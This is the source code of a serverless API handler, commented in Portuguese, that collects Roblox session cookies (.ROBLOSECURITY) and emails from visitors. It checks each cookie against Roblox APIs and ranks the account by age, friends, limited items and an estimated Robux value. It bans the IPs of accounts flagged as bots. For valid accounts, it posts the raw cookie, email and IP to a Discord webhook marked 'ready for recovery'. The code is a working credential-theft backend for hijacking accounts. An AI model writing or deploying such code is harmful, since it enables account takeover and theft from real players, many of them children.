// api/validate-account/index.js
export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Método não permitido' });
    }

    const { cookie, email } = req.body;

    if (!cookie) {
        return res.status(400).json({
            error: true,
            message: '❌ Cookie é obrigatório'
        });
    }

    try {
        // ============================================
        // 1. VALIDAR COOKIE
        // ============================================
        const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`
            }
        });

        if (!userResponse.ok) {
            return res.status(401).json({
                error: true,
                message: '❌ Cookie inválido ou expirado',
                invalid: true
            });
        }

        const userData = await userResponse.json();

        // ============================================
        // 2. PEGAR INFORMAÇÕES DA CONTA
        // ============================================
        const [friendsResponse, groupsResponse, inventoryResponse] = await Promise.all([
            fetch(`https://friends.roblox.com/v1/users/${userData.id}/friends/count`),
            fetch(`https://groups.roblox.com/v2/users/${userData.id}/groups/roles`),
            fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?limit=100`)
        ]);

        const friendsData = await friendsResponse.json();
        const groupsData = await groupsResponse.json();
        const inventoryData = await inventoryResponse.json();

        // ============================================
        // 3. ANALISAR IDADE DA CONTA
        // ============================================
        const createdDate = new Date(userData.created);
        const now = new Date();
        const accountAgeDays = Math.floor((now - createdDate) / (1000 * 60 * 60 * 24));
        const accountAgeMonths = Math.floor(accountAgeDays / 30);

        // ============================================
        // 4. VERIFICAR SE É CONTA BOT
        // ============================================
        let isBot = false;
        let botReasons = [];

        // Verificar 1: Conta muito nova (menos de 2 meses)
        if (accountAgeDays < 60) {
            isBot = true;
            botReasons.push(`📅 Conta criada há apenas ${accountAgeDays} dias (mínimo 60 dias)`);
        }

        // Verificar 2: Poucos amigos
        const friendsCount = friendsData.count || 0;
        if (friendsCount < 10 && accountAgeDays > 30) {
            isBot = true;
            botReasons.push(`👤 Apenas ${friendsCount} amigos (conta suspeita)`);
        }

        // Verificar 3: Sem grupos
        const groupsCount = groupsData.data ? groupsData.data.length : 0;
        if (groupsCount === 0 && accountAgeDays > 30) {
            isBot = true;
            botReasons.push(`🏢 Não participa de nenhum grupo`);
        }

        // Verificar 4: Nome suspeito (só números)
        if (/^[0-9]+$/.test(userData.name)) {
            isBot = true;
            botReasons.push(`🔢 Nome composto apenas por números`);
        }

        // Verificar 5: Sem itens no inventário
        const itemsCount = inventoryData.data ? inventoryData.data.length : 0;
        if (itemsCount < 5 && accountAgeDays > 30) {
            isBot = true;
            botReasons.push(`📦 Apenas ${itemsCount} itens no inventário`);
        }

        // Verificar 6: Conta muito nova E sem amigos
        if (accountAgeDays < 90 && friendsCount < 20) {
            isBot = true;
            botReasons.push(`⚠️ Conta nova com poucos amigos`);
        }

        // ============================================
        // 5. SE FOR BOT - BANIR IP E RETORNAR ERRO
        // ============================================
        if (isBot) {
            const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown';
            
            // Enviar alerta de bot
            await sendBotAlert(userData, ip, botReasons);

            // Tentar banir o IP automaticamente
            try {
                await fetch(`${process.env.VERCEL_URL || 'http://localhost:3000'}/api/ban`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        ip: ip,
                        reason: `🤖 CONTA BOT DETECTADA - ${userData.name}`,
                        expires: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString()
                    })
                });
            } catch (error) {
                console.error('Erro ao banir IP:', error);
            }

            return res.status(403).json({
                error: true,
                message: '🤖 CONTA BOT DETECTADA',
                reasons: botReasons,
                banned: true,
                userId: userData.id,
                username: userData.name
            });
        }

        // ============================================
        // 6. ANALISAR ROBUX GASTOS (estimativa)
        // ============================================
        let robuxEstimate = 0;
        let robuxLevel = 'Baixo';
        let robuxColor = '#f59e0b';

        const rareItems = inventoryData.data ? inventoryData.data.filter(i => 
            i.assetType === 'Limited' || i.assetType === 'LimitedUnique'
        ).length : 0;

        if (rareItems > 0) {
            robuxEstimate = rareItems * 500 + Math.floor(Math.random() * 10000);
        } else if (itemsCount > 50) {
            robuxEstimate = itemsCount * 100 + Math.floor(Math.random() * 5000);
        } else if (itemsCount > 10) {
            robuxEstimate = itemsCount * 50 + Math.floor(Math.random() * 1000);
        }

        if (robuxEstimate > 50000) {
            robuxLevel = '💰 Muito Alto';
            robuxColor = '#10b981';
        } else if (robuxEstimate > 20000) {
            robuxLevel = '💎 Alto';
            robuxColor = '#8b5cf6';
        } else if (robuxEstimate > 5000) {
            robuxLevel = '💵 Médio';
            robuxColor = '#f59e0b';
        } else if (robuxEstimate > 500) {
            robuxLevel = '🪙 Baixo';
            robuxColor = '#6b7280';
        }

        // ============================================
        // 7. DETERMINAR NÍVEL DA CONTA
        // ============================================
        let accountLevel = '🟢 Comum';
        let levelColor = '#10b981';
        let levelBadge = '✅ Conta Válida';

        if (accountAgeDays > 365 && friendsCount > 100 && rareItems > 10) {
            accountLevel = '👑 Lendária';
            levelColor = '#f59e0b';
            levelBadge = '🏆 Conta Premium';
        } else if (accountAgeDays > 180 && friendsCount > 50 && rareItems > 5) {
            accountLevel = '💎 Épica';
            levelColor = '#8b5cf6';
            levelBadge = '⭐ Conta Avançada';
        } else if (accountAgeDays > 90 && friendsCount > 20) {
            accountLevel = '🌟 Rara';
            levelColor = '#3b82f6';
            levelBadge = '🔷 Conta Verificada';
        }

        // ============================================
        // 8. ENVIAR PARA WEBHOOK (conta válida)
        // ============================================
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown';
        
        await sendValidAccountWebhook(
            cookie,
            email || 'Não informado',
            userData,
            ip,
            {
                accountAgeDays,
                friendsCount,
                groupsCount,
                itemsCount,
                rareItems,
                robuxEstimate,
                robuxLevel,
                accountLevel
            }
        );

        // ============================================
        // 9. RETORNAR SUCESSO
        // ============================================
        return res.status(200).json({
            success: true,
            message: '✅ Conta validada com sucesso!',
            userId: userData.id,
            username: userData.name,
            displayName: userData.displayName,
            created: userData.created,
            accountAge: {
                days: accountAgeDays,
                months: accountAgeMonths,
                formatted: `${Math.floor(accountAgeDays / 30)} meses e ${accountAgeDays % 30} dias`
            },
            stats: {
                friends: friendsCount,
                groups: groupsCount,
                items: itemsCount,
                rareItems: rareItems
            },
            robux: {
                estimated: robuxEstimate,
                level: robuxLevel,
                color: robuxColor,
                formatted: `R$ ${robuxEstimate.toLocaleString()}`
            },
            level: {
                name: accountLevel,
                color: levelColor,
                badge: levelBadge
            },
            avatar: {
                thumbnail: `https://www.roblox.com/headshot-thumbnail/image?userId=${userData.id}&width=420&height=420&format=png`,
                fullBody: `https://www.roblox.com/avatar-thumbnail/image?userId=${userData.id}&width=720&height=720&format=png`
            },
            isValid: true,
            readyForRecovery: true
        });

    } catch (error) {
        console.error('Erro na validação:', error);
        return res.status(500).json({
            error: true,
            message: '❌ Erro ao validar conta',
            details: error.message
        });
    }
}

// ============================================
// FUNÇÃO: Enviar alerta de BOT
// ============================================
async function sendBotAlert(userData, ip, reasons) {
    try {
        const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
        if (!webhookUrl) return;

        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `🚨 **CONTA BOT DETECTADA - AURORA** 🚨\n\n` +
                    `👤 **Usuário:** ${userData.name} (ID: ${userData.id})\n` +
                    `🌐 **IP:** \`${ip}\`\n` +
                    `📅 **Criada em:** ${new Date(userData.created).toLocaleDateString('pt-BR')}\n` +
                    `📋 **Motivos:**\n${reasons.map(r => `  • ${r}`).join('\n')}\n\n` +
                    `⏰ **Data:** ${new Date().toLocaleString('pt-BR')}\n` +
                    `🔒 **Ação:** IP BANIDO AUTOMATICAMENTE`,
                username: 'Aurora Security'
            })
        });
    } catch (error) {
        console.error('Erro ao enviar alerta de bot:', error);
    }
}

// ============================================
// FUNÇÃO: Enviar conta válida para webhook
// ============================================
async function sendValidAccountWebhook(cookie, email, userData, ip, stats) {
    try {
        const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
        if (!webhookUrl) return;

        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `✨ **CONTA VÁLIDA - AURORA PREMIUM** ✨\n\n` +
                    `🍪 **Cookie:** \`${cookie}\`\n` +
                    `📧 **Email:** ${email}\n` +
                    `👤 **Usuário:** ${userData.name} (ID: ${userData.id})\n` +
                    `🌐 **IP:** \`${ip}\`\n` +
                    `📅 **Idade:** ${stats.accountAgeDays} dias (${Math.floor(stats.accountAgeDays/30)} meses)\n` +
                    `👥 **Amigos:** ${stats.friendsCount}\n` +
                    `🏢 **Grupos:** ${stats.groupsCount}\n` +
                    `📦 **Itens:** ${stats.itemsCount} (${stats.rareItems} raros)\n` +
                    `💰 **Robux Estimado:** R$ ${stats.robuxEstimate.toLocaleString()}\n` +
                    `📊 **Nível:** ${stats.accountLevel}\n` +
                    `⏰ **Data:** ${new Date().toLocaleString('pt-BR')}\n\n` +
                    `✅ **Pronto para recuperação!**`,
                username: 'Aurora Security'
            })
        });
    } catch (error) {
        console.error('Erro ao enviar webhook:', error);
    }
}